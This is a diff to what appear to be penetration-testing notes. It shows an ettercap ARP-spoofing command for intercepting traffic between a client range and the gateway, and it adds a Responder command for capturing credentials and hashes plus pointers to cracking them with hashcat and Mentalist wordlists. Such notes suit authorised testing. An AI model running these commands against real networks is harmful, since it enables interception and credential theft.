@@ -14,6 +14,21 @@ sudo ettercap -T -M arp:remote /10.1.4.1-220// /10.1.31.1// -w capture_file_name
 In this example, we ARP spoof the clients on IP range 10.1.4.1-220 and the default gateway 10.1.31.1. This allows us to capture all network traffic between the hosts and the default gateway.
 The captured traffic can be analyzed for interesting information. 
 
+Next step can be to grab credentials/hashes with responder:
+
+```bash
+sudo responder -I eth0 -b -w
+```
+
+If you obtained hashes you can crack it with several approaches in hashcat:
+__Mask__
+
+__Custom crafted wordlist__
+[Mentalist](https://github.com/sc0tfree/mentalist) is a great tool to create visually custom wordlists. 
+
+![Mentalist_config](https://user-images.githubusercontent.com/9286611/141745990-642b15a6-0f63-4f32-9de1-f2cd79e4a50d.png)
+
+
 ## Web Interfaces - Default Credentials
 Runs eyewitness with input a Nessus file, saves output to folder:
 ```bash
